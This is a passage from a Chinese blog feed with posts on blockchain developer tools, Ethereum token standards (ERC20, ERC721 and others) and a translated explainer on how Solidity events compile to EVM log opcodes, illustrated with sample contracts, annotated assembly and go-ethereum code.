— 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-总结&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-总结&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 总结&quot;&gt;&lt;/a&gt;深入以太坊虚拟机 总结&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文是 &lt;a href=&quot;https://</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>区块链 &amp; 智能合约工具</title>
    <link href="https://alphafitz.com/2022/10/13/tools-about-blockchain-and-smart-contract/"/>
    <id>https://alphafitz.com/2022/10/13/tools-about-blockchain-and-smart-contract/</id>
    <published>2022-10-13T09:11:14.000Z</published>
    <updated>2022-10-14T03:25:55.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="区块链-amp-智能合约工具"><a href="#区块链-amp-智能合约工具" class="headerlink" title="区块链 &amp; 智能合约工具"></a>区块链 &amp; 智能合约工具</h1><ul><li><a href="https://hardhat.org/">Hardhat - 基于 Node.js 的以太坊智能合约开发框架</a></li><li><a href="https://github.com/foundry-rs/foundry">Foundry - Rust 编写的以太坊应用开发工具包</a></li><li><a href="https://github.com/Jon-Becker/heimdall-rs/wiki">Heimdall - 先进的EVM工具包，旨在简化基于EVM的链上智能合约处理</a></li><li>交易调试工具<ul><li><a href="https://phalcon.blocksec.com/">Phalcon(实现了以太坊上任意区块任意位置模拟任何交易)</a> | <a href="https://tx.eth.samczsun.com/">Tx.viewer</a> | <a href="https://ethtx.info/">Ethtx</a> | <a href="https://dashboard.tenderly.co/explorer">Tenderly</a></li></ul></li><li>以太坊签名数据库<ul><li><a href="https://www.4byte.directory/">4byte</a> | <a href="https://sig.eth.samczsun.com/">sig.eth</a> | <a href="https://www.etherface.io/hash">etherface</a></li></ul></li><li>ABI &amp; calldata 解析<ul><li><a href="https://gnidan.github.io/abi-to-sol/">ABI to interface</a> | <a href="https://abi.w1nt3r.xyz/">Get ABI for unverified contracts</a> | <a href="https://apoorvlathey.com/eth-calldata-decoder/">ETH Calldata Decoder</a></li></ul></li><li>反编译<ul><li><a href="https://oko.palkeo.com/">Oko Contract Explorer</a></li></ul></li><li>以太坊浏览器智能合约下载<ul><li><a href="https://smart-contract-downloader.vercel.app/">Smart Contract Downloader</a></li></ul></li><li>dΞth 网站<ul><li><a href="https://github.com/dethcrypto/dethcode">以 VSCode 的形式浏览部署的以太坊合约源代码</a> </li><li><a href="https://github.com/dethcrypto/TypeChain">以太坊智能合约的 TypeScript 绑定</a></li><li><a href="https://github.com/dethcrypto/eth-sdk">用于以太坊智能合约的类型安全、轻量级的 SDK</a></li></ul></li><li><a href="https://chainbase.online/">Chainbase</a></li><li><a href="https://dune.com/browse/dashboards">Dune 看板</a></li><li><a href="https://tokenterminal.com/">Token Terminal</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;区块链-amp-智能合约工具&quot;&gt;&lt;a href=&quot;#区块链-amp-智能合约工具&quot; class=&quot;headerlink&quot; title=&quot;区块链 &amp;amp; 智能合约工具&quot;&gt;&lt;/a&gt;区块链 &amp;amp; 智能合约工具&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="开发工具" scheme="https://alphafitz.com/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    <category term="开发工具" scheme="https://alphafitz.com/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>以太坊主流代币标准</title>
    <link href="https://alphafitz.com/2022/10/11/ethereum-mainstream-token-standard/"/>
    <id>https://alphafitz.com/2022/10/11/ethereum-mainstream-token-standard/</id>
    <published>2022-10-11T09:55:47.000Z</published>
    <updated>2022-10-23T11:19:49.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以太坊主流代币标准"><a href="#以太坊主流代币标准" class="headerlink" title="以太坊主流代币标准"></a>以太坊主流代币标准</h1><h2 id="EIP-和-ERC"><a href="#EIP-和-ERC" class="headerlink" title="EIP 和 ERC"></a>EIP 和 ERC</h2><p><a href="https://eips.ethereum.org/">EIP</a> 的全称是“Ethereum Improvement Proposal”，即以太坊改进建议，描述以太坊平台的标准，包括核心协议规范、客户端 API 和合约标准。EIPs 被分为多个类型，每种类型都有自己的 EIP 列表。标准 EIP 可以分为几类：<a href="https://eips.ethereum.org/core">Core</a>、<a href="https://eips.ethereum.org/networking">Networking</a>、<a href="https://eips.ethereum.org/interface">Interface</a>、<a href="https://eips.ethereum.org/erc">ERC</a>、<a href="https://eips.ethereum.org/meta">Meta</a>、<a href="https://eips.ethereum.org/informational">Informational</a>。ERC 是 EIP 中的一部分。</p><p>ERC 全称是“Ethereum Request for Comment”，后面的数字是其编号，比如 EIP-20 提案对应的就是 ERC20 标准。ERC 是应用程序级标准和约定，包括合约标准比如代币标准、名称注册、URI 方案、库&#x2F;包格式和账户抽象。</p><h2 id="主流ERC代币标准"><a href="#主流ERC代币标准" class="headerlink" title="主流ERC代币标准"></a>主流ERC代币标准</h2><p><a href="https://eips.ethereum.org/erc">ERC</a> 页面给出了所有 ERC 相关的改进建议。其中比较主流的代币标准及对应的 EIP 有：ERC20 (<a href="https://eips.ethereum.org/EIPS/eip-20">EIP-20</a>)、ERC721 (<a href="https://eips.ethereum.org/EIPS/eip-721">EIP-721</a>)、ERC1155 (<a href="https://eips.ethereum.org/EIPS/eip-1155">EIP-1155</a>)、ERC3475 (<a href="https://eips.ethereum.org/EIPS/eip-3475">EIP-3475</a>) 和 ERC3525 (<a href="https://eips.ethereum.org/EIPS/eip-3525">EIP-3525</a>)。</p><p>下面分别是 Web3Caff Research 和 捕鲸船社区 给出的以太坊主流代币标准对比。</p><img src="/2022/10/11/ethereum-mainstream-token-standard/EthereumTokenStandard_web3caff.jpg" class="" title="以太坊主流 Token 标准含最新债券标准定义概览图"><center> 以太坊主流 Token 标准含最新债券标准定义概览图 </center><img src="/2022/10/11/ethereum-mainstream-token-standard/EthereumTokenStandard_MasterCui.jpg" class="" title="一张图看懂以太坊主流 Token 标准含最新债券标准"><center> 一张图看懂以太坊主流 Token 标准含最新债券标准 </center><h2 id="代币标准链接"><a href="#代币标准链接" class="headerlink" title="代币标准链接"></a>代币标准链接</h2><p><a href="https://docs.openzeppelin.com/contracts/4.x/">OpenZeppelin</a> 智能合约库给出了 ERC20、ERC721、ERC777(<a href="https://eips.ethereum.org/EIPS/eip-777">EIP-777</a>)、ERC1155 多个 ERC 标准的库。开发人员可以通过使用合约库来复用代码和接口，更方便地构建相应的项目。</p><p>ERC20 代币标准：</p><ul><li><a href="http://alphafitz.com/2022/10/22/erc20-token-standard/">ERC20 代币标准</a></li><li><a href="https://eips.ethereum.org/EIPS/eip-20">EIP-20: Token Standard</a></li></ul><p>ERC721 非同质化代币标准：</p><ul><li><a href="http://alphafitz.com/2022/10/23/erc721-non-fungible-token-standard/">ERC721 非同质化代币标准</a></li><li><a href="https://eips.ethereum.org/EIPS/eip-721">EIP-721: Non-Fungible Token Standard</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.panewslab.com/zh_hk/articledetails/N3023378.html">以太坊智能合约中的ERC标准是什么？| PANews</a></li><li><a href="https://eips.ethereum.org/">Ethereum Improvement Proposals | 以太坊改进建议</a></li><li><a href="https://research.web3caff.com/zh/archives/1996">Web3 债券标准之争：ERC-3475 与 ERC-3525 对比研究报告 – Web3Caff Research</a></li><li><a href="https://twitter.com/Whaler_DAO">Whaler DAO (@Whaler_DAO) | Twitter</a><br /></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;以太坊主流代币标准&quot;&gt;&lt;a href=&quot;#以太坊主流代币标准&quot; class=&quot;headerlink&quot; title=&quot;以太坊主流代币标准&quot;&gt;&lt;/a&gt;以太坊主流代币标准&lt;/h1&gt;&lt;h2 id=&quot;EIP-和-ERC&quot;&gt;&lt;a href=&quot;#EIP-和-ERC&quot; class</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="ERC标准" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/ERC%E6%A0%87%E5%87%86/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="DeFi" scheme="https://alphafitz.com/tags/DeFi/"/>
    
    <category term="NFT" scheme="https://alphafitz.com/tags/NFT/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part6 — Solidity 事件实现</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/</id>
    <published>2022-10-07T08:39:57.000Z</published>
    <updated>2022-10-17T04:06:25.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part6-—-Solidity-事件实现"><a href="#深入以太坊虚拟机-Part6-—-Solidity-事件实现" class="headerlink" title="深入以太坊虚拟机 Part6 — Solidity 事件实现"></a>深入以太坊虚拟机 Part6 — Solidity 事件实现</h1><blockquote><p>原文：<a href="https://blog.qtum.org/how-solidity-events-are-implemented-diving-into-the-ethereum-vm-part-6-30e07b3037b9">How Solidity Events Are Implemented — Diving Into The Ethereum VM Part 6 | by Howard | Jan 21, 2018</a></p></blockquote><p>在上一部分中，我们了解了“方法”是如何建立在更简单的 EVM 原语（如“跳转”和“比较”指令）之上的抽象。</p><p>在本文中，我们将深入探讨 <a href="https://docs.soliditylang.org/en/develop/contracts.html#events">Solidity Events</a>。总的来说，事件日志有三种主要用途：</p><ul><li>作为替代返回值，因为交易不记录方法的返回值。</li><li>作为一种更便宜的替代数据存储，只要合约不需要访问它。</li><li>最后，作为 DApp 客户端可以订阅的事件。</li></ul><p>事件日志是一个相对复杂的语言特性。但就像方法一样，它们映射到更简单的 EVM 日志原语。</p><p>通过了解事件是如何使用较低级别的 EVM 指令实现的，以及它们的成本，我们将获得更好的直觉来有效地使用事件。</p><p>如果你对前面的内容不熟悉，请阅读前面的文章：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li></ul><h2 id="Solidity-Events"><a href="#Solidity-Events" class="headerlink" title="Solidity Events"></a>Solidity Events</h2><p>Solidity 事件如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Deposit</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _from<span class="token punctuation">,</span><span class="token builtin">bytes32</span> <span class="token keyword">indexed</span> _id<span class="token punctuation">,</span><span class="token builtin">uint</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>它的名称为 <code>Deposit</code>​；</li><li>它具有三个不同类型的参数；</li><li>其中两种类型是 “indexed”；</li><li>一个参数不是 “indexed”。</li></ul><p>Solidity 事件有两个奇怪的限制：</p><ul><li>最多可以有 3 个索引参数；</li><li>如果索引参数的类型大于 32 字节（比如 string 和 bytes），则不存储实际数据，而是存储数据的 KECCAK256 摘要。</li></ul><p>为什么会这样？索引参数和非索引参数有什么区别？</p><h2 id="EVM-Log-Primitives"><a href="#EVM-Log-Primitives" class="headerlink" title="EVM Log Primitives"></a>EVM Log Primitives</h2><p>要开始了解 Solidity 事件的这些怪癖和限制，让我们看一下 <code>log0</code>​、<code>log1</code>​、…、<code>log4</code>​ EVM 指令。</p><p>EVM 日志工具使用与 Solidity 不同的术语：</p><ul><li>“topics”：最多可以有 4 个主题(topic)。每个主题正好是 32 个字节。</li><li>“data”：数据是事件的有效负载(payload)。它可以是任意数量的字节。</li></ul><p>Solidity 事件如何映射到日志原语？</p><ul><li>事件的所有“非索引参数”都存储为数据。</li><li>事件的每个“索引参数”都存储为一个 32 字节的主题。</li></ul><p>由于 string 和 bytes 可能超过 32 个字节，如果它们被索引，Solidity 将存储 KECCAK256 摘要而不是实际数据。</p><p>Solidity 最多允许拥有 3 个索引参数，但 EVM 最多允许拥有 4 个主题。事实证明，Solidity 将一个主题用作事件的签名。</p><h2 id="The-log0-Primitive"><a href="#The-log0-Primitive" class="headerlink" title="The log0 Primitive"></a>The log0 Primitive</h2><p>最简单的日志原语是 <code>log0</code>​。这将创建一个只有数据但没有主题的日志项。日志的数据可以是任意字节数。</p><p>我们可以在 Solidity 中直接使用 <code>log0</code>​。在本例中，我们将存储一个 32 字节的数字：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">log0</span><span class="token punctuation">(</span><span class="token number">0xc0fefe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>生成的汇编可以分为两半。前半部分将日志数据（<code>0xc0fefe</code>​）从堆栈复制到内存中。后半部分将 <code>log0</code>​ 指令的参数放在堆栈上，告诉它在内存中加载数据的位置。</p><p>带注释的汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">memory: <span class="token punctuation">&#123;</span> 0x40 <span class="token operator">=</span><span class="token operator">></span> 0x60 <span class="token punctuation">&#125;</span>tag_1:  // copy data into memory  0xc0fefe    <span class="token punctuation">[</span>0xc0fefe<span class="token punctuation">]</span>  mload<span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>    <span class="token punctuation">[</span>0x60 0xc0fefe<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0xc0fefe 0x60<span class="token punctuation">]</span>  dup2    <span class="token punctuation">[</span>0x60 0xc0fefe 0x60<span class="token punctuation">]</span>  mstore    <span class="token punctuation">[</span>0x60<span class="token punctuation">]</span>    memory: <span class="token punctuation">&#123;</span>      0x40 <span class="token operator">=</span><span class="token operator">></span> 0x60      0x60 <span class="token operator">=</span><span class="token operator">></span> 0xc0fefe    <span class="token punctuation">&#125;</span>// calculate data start position and size  0x20    <span class="token punctuation">[</span>0x20 0x60<span class="token punctuation">]</span>  <span class="token function">add</span>    <span class="token punctuation">[</span>0x80<span class="token punctuation">]</span>  mload<span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>    <span class="token punctuation">[</span>0x60 0x80<span class="token punctuation">]</span>  dup1    <span class="token punctuation">[</span>0x60 0x60 0x80<span class="token punctuation">]</span>  swap2    <span class="token punctuation">[</span>0x60 0x80 0x60<span class="token punctuation">]</span>  sub    <span class="token punctuation">[</span>0x20 0x60<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0x60 0x20<span class="token punctuation">]</span>log0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>就在执行 <code>log0</code>​ 之前，堆栈上有两个参数：<code>[0x60 0x20]</code>​。</p><ul><li><code>start</code>​：0x60 是内存中加载数据的位置。</li><li><code>size</code>​：0x20（或32）指定要加载的数据的字节数。</li></ul><p><code>log0</code>​ 的 go-ethereum 实现如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">log0</span><span class="token punctuation">(</span>pc <span class="token operator">*</span><span class="token builtin">uint64</span><span class="token punctuation">,</span> evm <span class="token operator">*</span>EVM<span class="token punctuation">,</span> contract <span class="token operator">*</span>Contract<span class="token punctuation">,</span> memory <span class="token operator">*</span>Memory<span class="token punctuation">,</span> stack <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mStart<span class="token punctuation">,</span> mSize <span class="token operator">:=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">:=</span> memory<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>mStart<span class="token punctuation">.</span><span class="token function">Int64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mSize<span class="token punctuation">.</span><span class="token function">Int64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">.</span><span class="token function">AddLog</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>types<span class="token punctuation">.</span>Log<span class="token punctuation">&#123;</span>Address<span class="token punctuation">:</span> contract<span class="token punctuation">.</span><span class="token function">Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Data<span class="token punctuation">:</span>    data<span class="token punctuation">,</span><span class="token comment">// This is a non-consensus field, but assigned here because</span><span class="token comment">// core/state doesn't know the current block number.</span>BlockNumber<span class="token punctuation">:</span> evm<span class="token punctuation">.</span>BlockNumber<span class="token punctuation">.</span><span class="token function">Uint64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>evm<span class="token punctuation">.</span>interpreter<span class="token punctuation">.</span>intPool<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>mStart<span class="token punctuation">,</span> mSize<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>您可以在这段代码中看到 <code>log0</code>​ 从堆栈中弹出两个参数，然后从内存中复制数据。然后它调用 <code>StateDB.AddLog</code>​ 将日志与合约关联起来。</p><h2 id="Logging-With-Topics"><a href="#Logging-With-Topics" class="headerlink" title="Logging With Topics"></a>Logging With Topics</h2><p>主题是 32 字节的任意数据。以太坊实现将使用这些主题来索引日志，以实现高效的事件日志查询和过滤。</p><p>这个例子使用 <code>log2</code>​ 原语。第一个参数是数据（任意字节数），后跟 2 个主题（32 字节）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// log-2.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">log2</span><span class="token punctuation">(</span><span class="token number">0xc0fefe</span><span class="token punctuation">,</span> <span class="token number">0xaaaa1111</span><span class="token punctuation">,</span> <span class="token number">0xbbbb2222</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>汇编非常相似。唯一的区别是两个主题（<code>0xbbbb2222</code>​, <code>0xaaaa1111</code>​）在一开始就被压入堆栈：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_1:  // push topics  0xbbbb2222  0xaaaa1111// copy data into memory  0xc0fefe  mload<span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>  swap1  dup2  mstore  0x20  <span class="token function">add</span>  mload<span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>  dup1  swap2  sub  swap1// create log  log2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>数据还是 <code>0xc0fefe</code>​，复制到内存。在执行 <code>log2</code>​ 之前，EVM 的状态如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stack: <span class="token punctuation">[</span>0x60 0x20 0xaaaa1111 0xbbbb2222<span class="token punctuation">]</span>memory: <span class="token punctuation">&#123;</span>  0x60: 0xc0fefe<span class="token punctuation">&#125;</span>log2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>前两个参数指定用作日志数据的内存区域。两个额外的堆栈参数是两个 32 字节的主题。</p><h2 id="All-EVM-Logging-Primitives"><a href="#All-EVM-Logging-Primitives" class="headerlink" title="All EVM Logging Primitives"></a>All EVM Logging Primitives</h2><p>EVM 支持 5 个日志原语：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0xa0 LOG00xa1 LOG10xa2 LOG20xa3 LOG30xa4 LOG4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>除了使用的主题数量外，它们都是相同的。 go-ethereum 实现实际上使用相同的代码生成这些指令，只是大小不同，它指定要从堆栈中弹出的主题数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">makeLog</span><span class="token punctuation">(</span>size <span class="token builtin">int</span><span class="token punctuation">)</span> executionFunc <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span>pc <span class="token operator">*</span><span class="token builtin">uint64</span><span class="token punctuation">,</span> evm <span class="token operator">*</span>EVM<span class="token punctuation">,</span> contract <span class="token operator">*</span>Contract<span class="token punctuation">,</span> memory <span class="token operator">*</span>Memory<span class="token punctuation">,</span> stack <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>topics <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>common<span class="token punctuation">.</span>Hash<span class="token punctuation">,</span> size<span class="token punctuation">)</span>mStart<span class="token punctuation">,</span> mSize <span class="token operator">:=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>topics<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> common<span class="token punctuation">.</span><span class="token function">BigToHash</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>d <span class="token operator">:=</span> memory<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>mStart<span class="token punctuation">.</span><span class="token function">Int64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mSize<span class="token punctuation">.</span><span class="token function">Int64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">.</span><span class="token function">AddLog</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>types<span class="token punctuation">.</span>Log<span class="token punctuation">&#123;</span>Address<span class="token punctuation">:</span> contract<span class="token punctuation">.</span><span class="token function">Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Topics<span class="token punctuation">:</span>  topics<span class="token punctuation">,</span>Data<span class="token punctuation">:</span>    d<span class="token punctuation">,</span><span class="token comment">// This is a non-consensus field, but assigned here because</span><span class="token comment">// core/state doesn't know the current block number.</span>BlockNumber<span class="token punctuation">:</span> evm<span class="token punctuation">.</span>BlockNumber<span class="token punctuation">.</span><span class="token function">Uint64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>evm<span class="token punctuation">.</span>interpreter<span class="token punctuation">.</span>intPool<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>mStart<span class="token punctuation">,</span> mSize<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>随意看一下 sourcegraph 上的代码：<a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@83d16574444d0b389755c9003e74a90d2ab7ca2e/-/blob/core/vm/instructions.go#L744">https:&#x2F;&#x2F;sourcegraph.com&#x2F;github.com&#x2F;ethereum&#x2F;go-ethereum@83d16574444d0b389755c9003e74a90d2ab7ca2e&#x2F;-&#x2F;blob&#x2F;core&#x2F;vm&#x2F;instructions.go#L744</a></p><h2 id="Logging-Testnet-Demo"><a href="#Logging-Testnet-Demo" class="headerlink" title="Logging Testnet Demo"></a>Logging Testnet Demo</h2><p>让我们尝试使用已部署的合约生成一些日志。合约记录 5 次，使用不同的数据和主题：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 